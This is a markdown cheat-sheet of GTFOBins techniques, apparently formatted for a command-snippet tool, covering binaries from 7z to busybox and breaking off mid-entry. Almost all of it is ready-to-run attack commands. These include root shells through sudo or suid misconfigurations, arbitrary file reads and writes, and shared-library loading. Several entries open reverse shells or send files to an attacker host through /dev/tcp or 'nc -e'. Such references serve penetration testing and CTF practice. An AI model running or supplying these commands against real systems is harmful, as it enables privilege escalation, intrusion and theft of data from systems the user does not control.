# Gtfobins

Reference for [GTFOBins](https://gtfobins.github.io/) techniques. Each entry shows the canonical exploit code parameterized for the cheat system. Variables (`$lhost`, `$lport`, `$file_in`, `$file_out`, `$data`, `$lib`) prompt at runtime; `$scheme` and tun IP come from `common.md`.

## 7z

### 7z file-read

Read 7z file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read 7z File Read (7z file read (sudo / unprivileged)"
7z a -ttar -an -so $file_in | 7z e -ttar -si -so
```
<!-- cheat
var file_in
-->

## R

### R shell

Spawn r shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn R Shell (R shell (sudo / suid / unprivileged)"
R --no-save -e 'system("/bin/sh")'
```
<!-- cheat
-->

## aa-exec

### aa-exec shell

Spawn aa exec shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Aa Exec Shell (aa-exec shell (sudo / suid / unprivileged)"
aa-exec /bin/sh
```
<!-- cheat
-->

## ab

### ab download

Download ab download with the Gtfobins GTFOBins technique.

Pull a remote file to disk.

```sh title:"GTFOBins Download Ab Download (ab download (sudo / suid / unprivileged)"
ab -v2 $scheme://$lhost$file_in
```
<!-- cheat
import tun_ip
import scheme
var file_in
-->

### ab upload

Upload ab upload with the Gtfobins GTFOBins technique.

Push a local file to a remote receiver.

```sh title:"GTFOBins Upload Ab Upload (ab upload (sudo / suid / unprivileged)"
ab -p $file_in $scheme://$lhost/
```
<!-- cheat
import tun_ip
import scheme
var file_in
-->

## acr

### acr command

Execute acr command with the Gtfobins GTFOBins technique.

Execute an arbitrary non-interactive command.

```sh title:"GTFOBins Execute Acr Command (acr command (sudo / suid / unprivileged)"
echo -e 'x:\n\t/bin/sh 1>&0 2>&0' >$tmp_file
chmod +x $tmp_file
acr -r $tmp_file
```
<!-- cheat
var tmp_file
-->

## agetty

### agetty shell

Spawn agetty shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Agetty Shell (agetty shell (suid)"
agetty -l /bin/sh -o -p -a root tty
```
<!-- cheat
-->

## alpine

### alpine file-read

Read alpine file read with the Gtfobins GTFOBins technique.

The file is displayed in the terminal interface. Other options might be available, for example, by pressing `S` is possible to save the file content elsewhere.

```sh title:"GTFOBins Read Alpine File Read (alpine file read (sudo / suid / unprivileged)"
alpine -F $file_in
```
<!-- cheat
var file_in
-->

## ansible-playbook

### ansible-playbook shell

Spawn ansible playbook shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Ansible Playbook Shell (ansible-playbook shell (sudo / unprivileged)"
echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$tmp_file
ansible-playbook $tmp_file
```
<!-- cheat
var tmp_file
-->

## ansible-test

### ansible-test shell

Spawn ansible test shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Ansible Test Shell (ansible-test shell (sudo / unprivileged)"
ansible-test shell
```
<!-- cheat
-->

## aoss

### aoss shell

Spawn aoss shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Aoss Shell (aoss shell (sudo / unprivileged)"
aoss /bin/sh
```
<!-- cheat
-->

## apache2

### apache2 file-read #1

Read apache2 file read #1 with the Gtfobins GTFOBins technique.

The first line may be leaked as an error message.

```sh title:"GTFOBins Read Apache2 File Read #1 (apache2 file read (sudo / suid / unprivileged)"
apache2 -f $file_in
```
<!-- cheat
var file_in
-->

### apache2 file-read #2

Read apache2 file read #2 with the Gtfobins GTFOBins technique.

The first line may be leaked as an error message.

```sh title:"GTFOBins Read Apache2 File Read #2 (apache2 file read (sudo / suid / unprivileged)"
apache2 -C 'Define APACHE_RUN_DIR /' -C 'Include $file_in'
```
<!-- cheat
var file_in
-->

## apache2ctl

### apache2ctl file-read

Read apache2ctl file read with the Gtfobins GTFOBins technique.

The first line only is likely leaked as an error message.

```sh title:"GTFOBins Read Apache2ctl File Read (apache2ctl file read (sudo / unprivileged)"
apache2ctl -c 'Include $file_in'
```
<!-- cheat
var file_in
-->

## apport-cli

### apport-cli inherit (inherits from less)

Run apport CLI inherit (inherits from less) with the Gtfobins GTFOBins technique.

The terminal interface expects some choices in order to spawn tha pager.

```sh title:"GTFOBins Run Apport CLI Inherit (inherits from Less) (apport-cli inherit from less (unprivileged)"
apport-cli -f
1
2
v
```
<!-- cheat
-->

## apt

Alias of [apt-get](#apt_get). All techniques from `apt-get` apply.

## apt-get

### apt-get shell #1

Enumerate apt get shell #1 with the Gtfobins GTFOBins technique.

For this to work the target package (i.e., `sl`) must not be already installed.

```sh title:"GTFOBins Enumerate Apt Get Shell #1 (apt-get shell (sudo / suid)"
echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' >$tmp_file
apt-get -y install -c $tmp_file sl
```
<!-- cheat
var tmp_file
-->

### apt-get shell #2

Enumerate apt get shell #2 with the Gtfobins GTFOBins technique.

When the shell exits the `update` command is actually executed.

```sh title:"GTFOBins Enumerate Apt Get Shell #2 (apt-get shell (sudo / suid)"
apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```
<!-- cheat
-->

### apt-get inherit (inherits from less)

Enumerate apt get inherit (inherits from less) with the Gtfobins GTFOBins technique.

Inherit the capabilities of another binary by invoking it.

```sh title:"GTFOBins Enumerate Apt Get Inherit (inherits from Less) (apt-get inherit from less (sudo / unprivileged)"
apt-get changelog apt
```
<!-- cheat
-->

## aptitude

### aptitude inherit (inherits from less)

Run aptitude inherit (inherits from less) with the Gtfobins GTFOBins technique.

Inherit the capabilities of another binary by invoking it.

```sh title:"GTFOBins Run Aptitude Inherit (inherits from Less) (aptitude inherit from less (sudo / unprivileged)"
aptitude changelog aptitude
```
<!-- cheat
-->

## ar

### ar file-read

Read ar file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Ar File Read (ar file read (sudo / suid / unprivileged)"
ar r $file_out $file_in
ar p $file_out
```
<!-- cheat
var file_in
var file_out
-->

## arch-nspawn

### arch-nspawn shell

Spawn arch nspawn shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Arch Nspawn Shell (arch-nspawn shell (sudo)"
mkdir -p ./etc/
grep -oP "^CHROOT_VERSION='\K[^']+" /usr/share/devtools/lib/archroot.sh >.arch-chroot
touch ./etc/pacman.conf
echo 'CARCH=true;/bin/sh;exit' >etc/makepkg.conf
arch-nspawn .
```
<!-- cheat
-->

## aria2c

### aria2c command #1

Execute aria2c command #1 with the Gtfobins GTFOBins technique.

Note that the subprocess is immediately sent to the background.

```sh title:"GTFOBins Execute Aria2c Command #1 (aria2c command (sudo / suid / unprivileged)"
echo $cmd_file >$tmp_file
chmod +x $tmp_file
aria2c --on-download-error=$tmp_file http://some-invalid-domain
```
<!-- cheat
var cmd_file
var tmp_file
-->

### aria2c command #2

Execute aria2c command #2 with the Gtfobins GTFOBins technique.

The remote file `aaaaaaaaaaaaaaaa` (must be a string of 16 hex digit) contains the shell script, e.g., `$cmd_file`. Note that said file needs to be written on disk in order to be executed. `--allow-overwrite` is needed if this is executed multiple times with the same GID.

```sh title:"GTFOBins Execute Aria2c Command #2 (aria2c command (sudo / suid / unprivileged)"
aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=/bin/sh $scheme://$lhost/aaaaaaaaaaaaaaaa
```
<!-- cheat
import tun_ip
import scheme
-->

### aria2c file-read

Read aria2c file read with the Gtfobins GTFOBins technique.

The file is leaked as error messages.

```sh title:"GTFOBins Read Aria2c File Read (aria2c file read (sudo / suid / unprivileged)"
aria2c -i $file_in
```
<!-- cheat
var file_in
-->

### aria2c download

Download aria2c download with the Gtfobins GTFOBins technique.

Use `--allow-overwrite` if needed. Similarly `-o $file_out` can be omitted, in that case the file is saved to `input-file` in the current working directory.

```sh title:"GTFOBins Download Aria2c Download (aria2c download (sudo / suid / unprivileged)"
aria2c -o $file_out $scheme://$lhost$file_in
```
<!-- cheat
import tun_ip
import scheme
var file_in
var file_out
-->

## arj

### arj file-read

Read arj file read with the Gtfobins GTFOBins technique.

The `.arj` suffix will be added to `output-file`.

```sh title:"GTFOBins Read Arj File Read (arj file read (sudo / suid / unprivileged)"
arj a $file_out $file_in
arj p $file_out
```
<!-- cheat
var file_in
var file_out
-->

### arj file-write

Write arj file write with the Gtfobins GTFOBins technique.

The `.arj` suffix will be added to `x`.

```sh title:"GTFOBins Write Arj File Write (arj file write (sudo / suid / unprivileged)"
echo $data >output-file
arj a x output-file
arj e x $dir_out/
```
<!-- cheat
var data
var dir_out
-->

## arp

### arp file-read

Read arp file read with the Gtfobins GTFOBins technique.

Lines are likely leaked as error messages.

```sh title:"GTFOBins Read Arp File Read (arp file read (sudo / suid / unprivileged)"
arp -v -f $file_in
```
<!-- cheat
var file_in
-->

## as

### as file-read

Read as file read with the Gtfobins GTFOBins technique.

Lines are likely leaked as error messages.

```sh title:"GTFOBins Read as File Read (as file read (sudo / suid / unprivileged)"
as @$file_in
```
<!-- cheat
var file_in
-->

## ascii-xfr

### ascii-xfr file-read

Read ascii xfr file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Ascii Xfr File Read (ascii-xfr file read (sudo / suid / unprivileged)"
ascii-xfr -ns $file_in
```
<!-- cheat
var file_in
-->

## ascii85

### ascii85 file-read

Read ascii85 file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Ascii85 File Read (ascii85 file read (sudo / unprivileged)"
ascii85 $file_in | ascii85 --decode
```
<!-- cheat
var file_in
-->

## ash

### ash shell

Spawn ash shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Ash Shell (ash shell (sudo / suid / unprivileged)"
ash
```
<!-- cheat
-->

#### ash shell - suid override
Spawn ash shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Ash Shell (ash shell (suid variant)"
ash -p
```
<!-- cheat
-->

### ash file-write

Write ash file write with the Gtfobins GTFOBins technique.

Write attacker-controlled data to an arbitrary path.

```sh title:"GTFOBins Write Ash File Write (ash file write (sudo / suid / unprivileged)"
ash -c 'echo $data >$file_out'
```
<!-- cheat
var data
var file_out
-->

#### ash file-write - suid override
Write ash file write with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Write Ash File Write (ash file write (suid variant)"
ash -p -c 'echo $data >$file_out'
```
<!-- cheat
var data
var file_out
-->

## aspell

### aspell file-read #1

Read aspell file read #1 with the Gtfobins GTFOBins technique.

The textual file is displayed in an interactive TUI showing only the parts that contain mispelled words.

```sh title:"GTFOBins Read Aspell File Read #1 (aspell file read (sudo / suid / unprivileged)"
aspell -c $file_in
```
<!-- cheat
var file_in
-->

### aspell file-read #2

Read aspell file read #2 with the Gtfobins GTFOBins technique.

The first word is likely displayed as error messaged, and converted to lowercase.

```sh title:"GTFOBins Read Aspell File Read #2 (aspell file read (sudo / suid / unprivileged)"
aspell --conf $file_in
```
<!-- cheat
var file_in
-->

## asterisk

### asterisk shell

Spawn asterisk shell with the Gtfobins GTFOBins technique.

A server instance must be already running, otherwise it can be started with `sudo asterisk -F`. Moreover, the invoking user must be able to access the socket.

```sh title:"GTFOBins Spawn Asterisk Shell (asterisk shell (sudo / suid / unprivileged)"
asterisk -r
!/bin/sh
```
<!-- cheat
-->

## at

### at shell

Spawn at shell with the Gtfobins GTFOBins technique.

`tail` is used to pause the terminal.

```sh title:"GTFOBins Spawn At Shell (at shell (sudo / unprivileged)"
echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
```
<!-- cheat
-->

### at command

Execute at command with the Gtfobins GTFOBins technique.

Execute an arbitrary non-interactive command.

```sh title:"GTFOBins Execute At Command (at command (sudo / unprivileged)"
echo $cmd_file | at now
```
<!-- cheat
var cmd_file
-->

## atobm

### atobm file-read

Read atobm file read with the Gtfobins GTFOBins technique.

Outputs only the first line of the file to standard error without the `-` and `#` characters, this can be customized with the `-c` option, by default is `-c -#`. Content can be retrieved with `awk -F "'" '{printf "%s", $2}'`.

```sh title:"GTFOBins Read Atobm File Read (atobm file read (sudo / suid / unprivileged)"
atobm $file_in
```
<!-- cheat
var file_in
-->

## autoconf

### autoconf shell

Spawn autoconf shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Autoconf Shell (autoconf shell (sudo / unprivileged)"
echo /bin/sh >$tmp_file
chmod +x $tmp_file
touch configure.ac
AUTOM4TE=$tmp_file autoconf
```
<!-- cheat
var tmp_file
-->

## autoheader

### autoheader shell

Spawn autoheader shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Autoheader Shell (autoheader shell (sudo / unprivileged)"
echo '/bin/sh 1>&0' >$tmp_file
chmod +x $tmp_file
touch configure.ac
AUTOM4TE=$tmp_file autoheader
```
<!-- cheat
var tmp_file
-->

## autoreconf

### autoreconf shell

Enumerate autoreconf shell with the Gtfobins GTFOBins technique.

The shell is invoked multiple times.

```sh title:"GTFOBins Enumerate Autoreconf Shell (autoreconf shell (sudo / unprivileged)"
echo '/bin/sh 1>&0' >$tmp_file
chmod +x $tmp_file
echo AC_INIT >configure.ac
AUTOM4TE=$tmp_file autoreconf
```
<!-- cheat
var tmp_file
-->

## awk

Alias of [mawk](#mawk). All techniques from `mawk` apply.

## aws

### aws file-read

Read AWS file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read AWS File Read (aws file read (sudo / suid / unprivileged)"
aws ec2 describe-instances --filter file://$file_in
```
<!-- cheat
var file_in
-->

### aws inherit (inherits from less)

Run AWS inherit (inherits from less) with the Gtfobins GTFOBins technique.

Inherit the capabilities of another binary by invoking it.

```sh title:"GTFOBins Run AWS Inherit (inherits from Less) (aws inherit from less (sudo / unprivileged)"
aws help
```
<!-- cheat
-->

## base32

### base32 file-read

Read base32 file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Base32 File Read (base32 file read (sudo / suid / unprivileged)"
base32 $file_in | base32 --decode
```
<!-- cheat
var file_in
-->

## base58

### base58 file-read

Read base58 file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Base58 File Read (base58 file read (sudo / unprivileged)"
base58 $file_in | base58 --decode
```
<!-- cheat
var file_in
-->

## base64

### base64 file-read

Read base64 file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Base64 File Read (base64 file read (sudo / suid / unprivileged)"
base64 $file_in | base64 --decode
```
<!-- cheat
var file_in
-->

## basenc

### basenc file-read

Read basenc file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Basenc File Read (basenc file read (sudo / suid / unprivileged)"
basenc --base64 $file_in | basenc -d --base64
```
<!-- cheat
var file_in
-->

## basez

### basez file-read

Read basez file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Basez File Read (basez file read (sudo / suid / unprivileged)"
basez $file_in | basez --decode
```
<!-- cheat
var file_in
-->

## bash

### bash shell

Spawn bash shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Bash Shell (bash shell (sudo / suid / unprivileged)"
bash
```
<!-- cheat
-->

#### bash shell - suid override
Spawn bash shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Bash Shell (bash shell (suid variant)"
bash -p
```
<!-- cheat
-->

### bash reverse-shell

Start bash reverse shell with the Gtfobins GTFOBins technique.

Connect back to an attacker-controlled listener.

```sh title:"GTFOBins Start Bash Reverse Shell (bash reverse shell (sudo / suid / unprivileged)"
bash -c 'exec bash -i &>/dev/tcp/$lhost/$lport <&1'
```
<!-- cheat
import tun_ip
import lports
-->

#### bash reverse-shell - suid override
Start bash reverse shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Start Bash Reverse Shell (bash reverse shell (suid variant)"
bash -p -c 'exec bash -p -i &>/dev/tcp/$lhost/$lport <&1'
```
<!-- cheat
import tun_ip
import lports
-->

### bash file-read #1

Read bash file read #1 with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Bash File Read #1 (bash file read (sudo / suid / unprivileged)"
bash -c 'echo "$(<$file_in)"'
```
<!-- cheat
var file_in
-->

#### bash file-read #1 - suid override
Read bash file read #1 with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Read Bash File Read #1 (bash file read (suid variant)"
bash -p -c 'echo "$(<$file_in)"'
```
<!-- cheat
var file_in
-->

### bash file-read #2

Read bash file read #2 with the Gtfobins GTFOBins technique.

This only works interactively from an existing `bash` session.

```sh title:"GTFOBins Read Bash File Read #2 (bash file read (sudo / suid / unprivileged)"
HISTTIMEFORMAT=$'\r\e[K'
history -c
history -r $file_in
history
```
<!-- cheat
var file_in
-->

### bash file-write #1

Write bash file write #1 with the Gtfobins GTFOBins technique.

Write attacker-controlled data to an arbitrary path.

```sh title:"GTFOBins Write Bash File Write #1 (bash file write (sudo / suid / unprivileged)"
bash -c 'echo $data >$file_out'
```
<!-- cheat
var data
var file_out
-->

#### bash file-write #1 - suid override
Write bash file write #1 with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Write Bash File Write #1 (bash file write (suid variant)"
bash -p -c 'echo $data >$file_out'
```
<!-- cheat
var data
var file_out
-->

### bash file-write #2

Write bash file write #2 with the Gtfobins GTFOBins technique.

This only works interactively from an existing `bash` session. It adds timestamps to the output file.

```sh title:"GTFOBins Write Bash File Write #2 (bash file write (sudo / suid / unprivileged)"
HISTIGNORE='history *'
history -c
$data
history -w $file_out
```
<!-- cheat
var data
var file_out
-->

### bash download #1

Download bash download #1 with the Gtfobins GTFOBins technique.

Pull a remote file to disk.

```sh title:"GTFOBins Download Bash Download #1 (bash download (sudo / suid / unprivileged)"
bash -c '{ echo -ne "GET $file_in HTTP/1.0\r\nhost: $lhost\r\n\r\n" 1>&3; cat 0<&3; } \
    3<>/dev/tcp/$lhost/$lport \
    | { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } >$file_out'
```
<!-- cheat
import tun_ip
import lports
var file_in
var file_out
-->

#### bash download #1 - suid override
Download bash download #1 with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Download Bash Download #1 (bash download (suid variant)"
bash -p -c '{ echo -ne "GET $file_in HTTP/1.0\r\nhost: $lhost\r\n\r\n" 1>&3; cat 0<&3; } \
    3<>/dev/tcp/$lhost/$lport \
    | { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } >$file_out'
```
<!-- cheat
import tun_ip
import lports
var file_in
var file_out
-->

### bash download #2

Download bash download #2 with the Gtfobins GTFOBins technique.

Pull a remote file to disk.

```sh title:"GTFOBins Download Bash Download #2 (bash download (sudo / suid / unprivileged)"
bash -c 'echo "$(</dev/tcp/$lhost/$lport) >$file_out'
```
<!-- cheat
import tun_ip
import lports
var file_out
-->

#### bash download #2 - suid override
Download bash download #2 with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Download Bash Download #2 (bash download (suid variant)"
bash -p -c 'echo "$(</dev/tcp/$lhost/$lport) >$file_out'
```
<!-- cheat
import tun_ip
import lports
var file_out
-->

### bash upload #1

Upload bash upload #1 with the Gtfobins GTFOBins technique.

Push a local file to a remote receiver.

```sh title:"GTFOBins Upload Bash Upload #1 (bash upload (sudo / suid / unprivileged)"
bash -c 'echo -e "POST / HTTP/0.9\n\n$(<$file_in)" >/dev/tcp/$lhost/$lport'
```
<!-- cheat
import tun_ip
import lports
var file_in
-->

#### bash upload #1 - suid override
Upload bash upload #1 with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Upload Bash Upload #1 (bash upload (suid variant)"
bash -p -c 'echo -e "POST / HTTP/0.9\n\n$(<$file_in)" >/dev/tcp/$lhost/$lport'
```
<!-- cheat
import tun_ip
import lports
var file_in
-->

### bash upload #2

Upload bash upload #2 with the Gtfobins GTFOBins technique.

Push a local file to a remote receiver.

```sh title:"GTFOBins Upload Bash Upload #2 (bash upload (sudo / suid / unprivileged)"
bash -c 'echo -n "$(<$file_in)" >/dev/tcp/$lhost/$lport'
```
<!-- cheat
import tun_ip
import lports
var file_in
-->

#### bash upload #2 - suid override
Upload bash upload #2 with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Upload Bash Upload #2 (bash upload (suid variant)"
bash -p -c 'echo -n "$(<$file_in)" >/dev/tcp/$lhost/$lport'
```
<!-- cheat
import tun_ip
import lports
var file_in
-->

### bash library-load

Run bash library load with the Gtfobins GTFOBins technique.

Load an attacker-supplied shared library.

```sh title:"GTFOBins Run Bash Library Load (bash library load (sudo / suid / unprivileged)"
bash -c 'enable -f $lib x'
```
<!-- cheat
var lib
-->

#### bash library-load - suid override
Run bash library load with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Run Bash Library Load (bash library load (suid variant)"
bash -p -c 'enable -f $lib x'
```
<!-- cheat
var lib
-->

## bashbug

### bashbug inherit (inherits from vi)

Run bashbug inherit (inherits from vi) with the Gtfobins GTFOBins technique.

Inherit the capabilities of another binary by invoking it.

```sh title:"GTFOBins Run Bashbug Inherit (inherits from Vi) (bashbug inherit from vi (sudo / unprivileged)"
bashbug
```
<!-- cheat
-->

## batcat

### batcat inherit (inherits from less)

Read batcat inherit (inherits from less) with the Gtfobins GTFOBins technique.

`--paging always` can be omitted provided that the output doesn't fit the screen.

```sh title:"GTFOBins Read Batcat Inherit (inherits from Less) (batcat inherit from less (sudo / suid / unprivileged)"
batcat --paging always /etc/hosts
```
<!-- cheat
-->

## bbot

### bbot file-read

Read bbot file read with the Gtfobins GTFOBins technique.

The file is displayed in the debug log.

```sh title:"GTFOBins Read Bbot File Read (bbot file read (sudo / unprivileged)"
bbot -d -cy $file_in
```
<!-- cheat
var file_in
-->

## bc

### bc file-read

Read bc file read with the Gtfobins GTFOBins technique.

The file content is actually parsed and appears as error messages.

```sh title:"GTFOBins Read Bc File Read (bc file read (sudo / suid / unprivileged)"
bc -s $file_in
quit
```
<!-- cheat
var file_in
-->

## bconsole

### bconsole shell

Spawn bconsole shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Bconsole Shell (bconsole shell (sudo / unprivileged)"
bconsole
@exec /bin/sh
```
<!-- cheat
-->

### bconsole file-read

Read bconsole file read with the Gtfobins GTFOBins technique.

The file is actually parsed and the first wrong line is returned in an error message.

```sh title:"GTFOBins Read Bconsole File Read (bconsole file read (sudo / suid / unprivileged)"
bconsole -c $file_in
```
<!-- cheat
var file_in
-->

## bee

### bee inherit (inherits from php)

Run bee inherit (inherits from php) with the Gtfobins GTFOBins technique.

This allows to run PHP code (`...`).  This must be excuted from the Backdrop CMS root directory (e.g. `/var/www/html`), alternatively use the `--root` option.

```sh title:"GTFOBins Run Bee Inherit (inherits from Php) (bee inherit from php (sudo / suid / unprivileged)"
bee eval '...'
```
<!-- cheat
-->

## borg

### borg shell

Spawn borg shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Borg Shell (borg shell (sudo / unprivileged)"
borg extract @:/::: --rsh "/bin/sh -c '/bin/sh </dev/tty >/dev/tty 2>/dev/tty'"
```
<!-- cheat
-->

## bpftrace

### bpftrace shell #1

Spawn bpftrace shell #1 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Bpftrace Shell #1 (bpftrace shell (sudo)"
bpftrace --unsafe -e 'BEGIN {system("/bin/sh 1<&0");exit()}'
```
<!-- cheat
-->

### bpftrace shell #2

Spawn bpftrace shell #2 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Bpftrace Shell #2 (bpftrace shell (sudo)"
echo 'BEGIN {system("/bin/sh 1<&0");exit()}' >$tmp_file
bpftrace --unsafe $tmp_file
```
<!-- cheat
var tmp_file
-->

### bpftrace shell #3

Spawn bpftrace shell #3 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Bpftrace Shell #3 (bpftrace shell (sudo)"
bpftrace -c /bin/sh -e 'END {exit()}'
```
<!-- cheat
-->

## bridge

### bridge file-read

Read bridge file read with the Gtfobins GTFOBins technique.

Outputs the first line of the file (until the first whitespace) inside an error message to stdandard error.

```sh title:"GTFOBins Read Bridge File Read (bridge file read (sudo / suid / unprivileged)"
bridge -b $file_in
```
<!-- cheat
var file_in
-->

## bundle

### bundle shell #1

Spawn bundle shell #1 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Bundle Shell #1 (bundle shell (sudo / unprivileged)"
BUNDLE_GEMFILE=x bundle exec /bin/sh
```
<!-- cheat
-->

### bundle shell #2

Spawn bundle shell #2 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Bundle Shell #2 (bundle shell (sudo / unprivileged)"
touch Gemfile
bundle exec /bin/sh
```
<!-- cheat
-->

### bundle shell #3

Spawn bundle shell #3 with the Gtfobins GTFOBins technique.

This might run the shell twice, one after the other.

```sh title:"GTFOBins Spawn Bundle Shell #3 (bundle shell (sudo / unprivileged)"
echo 'system("/bin/sh")' >Gemfile
bundle install
```
<!-- cheat
-->

### bundle inherit #1 (inherits from less)

Run bundle inherit #1 (inherits from less) with the Gtfobins GTFOBins technique.

Inherit the capabilities of another binary by invoking it.

```sh title:"GTFOBins Run Bundle Inherit #1 (inherits from Less) (bundle inherit #1 inherit from less (sudo / unprivileged)"
bundle help
```
<!-- cheat
-->

### bundle inherit #2 (inherits from irb)

Run bundle inherit #2 (inherits from irb) with the Gtfobins GTFOBins technique.

Inherit the capabilities of another binary by invoking it.

```sh title:"GTFOBins Run Bundle Inherit #2 (inherits from Irb) (bundle inherit #2 inherit from irb (sudo / unprivileged)"
touch Gemfile
bundle console
```
<!-- cheat
-->

## bundler

Alias of [bundle](#bundle). All techniques from `bundle` apply.

## busctl

### busctl shell #1

Spawn busctl shell #1 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Busctl Shell #1 (busctl shell (sudo / suid / unprivileged)"
busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
```
<!-- cheat
-->

#### busctl shell #1 - suid override
Spawn busctl shell #1 with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Busctl Shell #1 (busctl shell (suid variant)"
busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'
```
<!-- cheat
-->

### busctl shell #2

Spawn busctl shell #2 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Busctl Shell #2 (busctl shell (sudo / suid / unprivileged)"
busctl --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
```
<!-- cheat
-->

#### busctl shell #2 - suid override
Spawn busctl shell #2 with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Busctl Shell #2 (busctl shell (suid variant)"
busctl --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'
```
<!-- cheat
-->

### busctl inherit (inherits from less)

Run busctl inherit (inherits from less) with the Gtfobins GTFOBins technique.

Inherit the capabilities of another binary by invoking it.

```sh title:"GTFOBins Run Busctl Inherit (inherits from Less) (busctl inherit from less (sudo / suid / unprivileged)"
busctl --show-machine
```
<!-- cheat
-->

## busybox

BusyBox may contain many utilities, run `busybox --list-full` to check what other binaries are supported.

### busybox reverse-shell

Start busybox reverse shell with the Gtfobins GTFOBins technique.

Connect back to an attacker-controlled listener.

```sh title:"GTFOBins Start Busybox Reverse Shell (busybox reverse shell (sudo / unprivileged)"
busybox nc -e /bin/sh $lhost $lport
```
<!-- cheat
import tun_ip
import lports
-->

### busybox upload

Upload busybox upload with the Gtfobins GTFOBins technique.

This serves files in the local folder via an HTTP server.

```sh title:"GTFOBins Upload Busybox Upload (busybox upload (sudo / unprivileged)"
busybox httpd -f -p $lport -h .
```
<!-- cheat
import lports
-->

### busybox inherit #1 (inherits from ash)

Run busybox inherit #1 (inherits from ash) with the Gtfobins GTFOBins technique.

Inherit the capabilities of another binary by invoking it.

```sh title:"GTFOBins Run Busybox Inherit #1 (inherits from Ash) (busybox inherit #1 inherit from ash (sudo / unprivileged)"
busybox ash
```
<!-- cheat
-->

### busybox inherit #2 (inherits from cat)

Read busybox inherit #2 (inherits from cat) with the Gtfobins GTFOBins technique.

Inherit the capabilities of another binary by invoking it.

